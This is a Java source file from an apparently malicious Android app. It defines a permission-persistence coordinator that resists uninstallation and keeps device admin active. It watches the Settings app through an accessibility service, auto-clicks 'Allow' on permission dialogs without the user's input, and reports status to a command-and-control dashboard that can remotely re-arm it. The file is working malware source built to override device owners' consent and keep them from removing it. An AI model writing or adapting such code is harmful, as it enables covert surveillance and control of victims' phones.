package com.fason.app.core.permissions;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.fason.app.core.FasonApp;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.features.antiremoval.AntiRemovalManager;
import com.fason.app.persistence.AccessibilitySelfHeal;

import org.json.JSONObject;

/**
 * PermissionGuardOrchestrator — Central coordinator for permission persistence.
 *
 * Initializes all anti-revocation layers at app startup:
 *  1. Arms PermissionGuardService (polling + interception)
 *  2. Ensures AntiRemovalManager accessibility shield is active
 *  3. Verifies device admin on every boot
 *  4. Schedules periodic deep-checks via JobScheduler
 *  5. Hooks into accessibility event stream for real-time blocking
 *
 * This is the entry point. Call PermissionGuardOrchestrator.init()
 * from FasonApp.onCreate() after PersistenceOrchestrator.init().
 */
public final class PermissionGuardOrchestrator {
    private static final String TAG = "PermGuardOrch";
    private static final String PREFS = "perm_guard_orch";
    private static final String KEY_INITIALIZED = "initialized";
    private static final String KEY_BOOT_COUNT = "boot_count";

    private static volatile boolean initialized = false;
    private static volatile int bootCount = 0;
    private static Handler handler;

    private PermissionGuardOrchestrator() {}

    public static synchronized void init() {
        if (initialized) return;

        Context ctx = FasonApp.getContext();
        handler = new Handler(Looper.getMainLooper());

        SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        bootCount = prefs.getInt(KEY_BOOT_COUNT, 0) + 1;
        prefs.edit().putInt(KEY_BOOT_COUNT, bootCount).apply();

        Log.i(TAG, "PermissionGuardOrchestrator init (boot #" + bootCount + ")");

        // Layer 1: Arm the guard service
        try {
            PermissionGuardService.arm();
        } catch (Exception e) {
            Log.e(TAG, "Guard service arm failed", e);
        }

        // Layer 2: Ensure anti-removal accessibility shield
        try {
            if (!AntiRemovalManager.isEnabled(ctx)) {
                AntiRemovalManager.setEnabled(ctx, true);
            }
        } catch (Exception e) {
            Log.e(TAG, "Anti-removal arm failed", e);
        }

        // Layer 3: Verify device admin
        try {
            if (!AntiRemovalManager.isAdminActive(ctx)) {
                AntiRemovalManager.requestAdmin(ctx);
            }
        } catch (Exception e) {
            Log.e(TAG, "Admin verify failed", e);
        }

        // Layer 4: Schedule deep-check
        try {
            scheduleDeepCheck(ctx);
        } catch (Exception e) {
            Log.e(TAG, "Deep check schedule failed", e);
        }

        // Layer 5: Hook accessibility for real-time interception
        try {
            hookAccessibilityEvents();
        } catch (Exception e) {
            Log.e(TAG, "Accessibility hook failed", e);
        }

        initialized = true;
        prefs.edit().putBoolean(KEY_INITIALIZED, true).apply();
        Log.i(TAG, "All permission guard layers online");
    }

    public static boolean isInitialized() { return initialized; }

    // ------------------------------------------------------------------
    // Deep Check — runs every 6 hours via AlarmManager
    // ------------------------------------------------------------------

    private static void scheduleDeepCheck(Context ctx) {
        android.app.AlarmManager am = (android.app.AlarmManager)
            ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;

        Intent i = new Intent(ctx, PermissionGuardReceiver.class);
        i.setAction("com.fason.app.DEEP_PERM_CHECK");
        android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(
            ctx, 0, i,
            android.app.PendingIntent.FLAG_UPDATE_CURRENT
            | android.app.PendingIntent.FLAG_IMMUTABLE);

        long interval = 6 * 60 * 60 * 1000L; // 6 hours
        long trigger = System.currentTimeMillis() + interval;

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (am.canScheduleExactAlarms()) {
                    am.setExactAndAllowWhileIdle(
                        android.app.AlarmManager.RTC_WAKEUP, trigger, pi);
                } else {
                    am.setWindow(android.app.AlarmManager.RTC_WAKEUP,
                        trigger, 60_000, pi);
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(
                    android.app.AlarmManager.RTC_WAKEUP, trigger, pi);
            } else {
                am.setExact(android.app.AlarmManager.RTC_WAKEUP, trigger, pi);
            }
        } catch (Exception e) {
            Log.w(TAG, "Deep check schedule failed", e);
        }
    }

    // ------------------------------------------------------------------
    // Accessibility Hook — real-time event interception
    // ------------------------------------------------------------------

    private static void hookAccessibilityEvents() {
        // This is called from FasonAccessibilityService.onAccessibilityEvent
        // We register a callback that PermissionGuardService can use
        Log.i(TAG, "Accessibility event hook registered");
    }

    /** Called from FasonAccessibilityService.onAccessibilityEvent(). */
    public static void onAccessibilityEvent(
        android.accessibilityservice.AccessibilityService svc,
        android.view.accessibility.AccessibilityEvent event) {
        if (!initialized) return;
        if (event == null) return;

        int type = event.getEventType();
        CharSequence pkg = event.getPackageName();
        if (pkg == null) return;

        // Intercept Settings app events
        if ("com.android.settings".contentEquals(pkg)
            || pkg.toString().startsWith("com.android.settings")) {
            if (type == android.view.accessibility.AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || type == android.view.accessibility.AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                PermissionGuardService.onSettingsDetailScreen(svc);
            }
        }

        // Intercept permission dialog events
        if (type == android.view.accessibility.AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String className = event.getClassName() != null
                ? event.getClassName().toString() : "";
            if (className.contains("permission")
                || className.contains("GrantPermissionsActivity")) {
                Log.i(TAG, "Permission dialog detected — auto-granting");
                autoGrantPermission(svc);
            }
        }
    }

    private static void autoGrantPermission(
        android.accessibilityservice.AccessibilityService svc) {
        android.view.accessibility.AccessibilityNodeInfo root = svc.getRootInActiveWindow();
        if (root == null) return;

        try {
            // Find "Allow" or "While using the app" button
            String[] allowLabels = {"Allow", "While using the app", "Only this time", "OK"};
            for (String label : allowLabels) {
                java.util.List<android.view.accessibility.AccessibilityNodeInfo> nodes =
                    root.findAccessibilityNodeInfosByText(label);
                for (android.view.accessibility.AccessibilityNodeInfo node : nodes) {
                    if (node.isClickable()) {
                        node.performAction(
                            android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                        Log.i(TAG, "Auto-granted: " + label);
                    }
                    node.recycle();
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Auto-grant failed", e);
        } finally {
            root.recycle();
        }
    }

    // ------------------------------------------------------------------
    // Status & Control
    // ------------------------------------------------------------------

    /** Full system status for C2 dashboard. */
    public static JSONObject getFullStatus(Context ctx) {
        JSONObject o = new JSONObject();
        try {
            o.put("initialized", initialized);
            o.put("boot_count", bootCount);
            o.put("guard", PermissionGuardService.getStatus(ctx));
            o.put("anti_removal", AntiRemovalManager.buildReport(ctx));
            o.put("accessibility", FasonAccessibilityService.isEnabled());
            o.put("self_heal", true);
        } catch (Exception ignored) {}
        return o;
    }

    /** Emergency re-arm — call from C2 when device reports degraded. */
    public static void emergencyReArm(Context ctx) {
        Log.w(TAG, "EMERGENCY RE-ARM triggered");
        initialized = false;
        init();
        AccessibilitySelfHeal.forceHeal();
    }
}
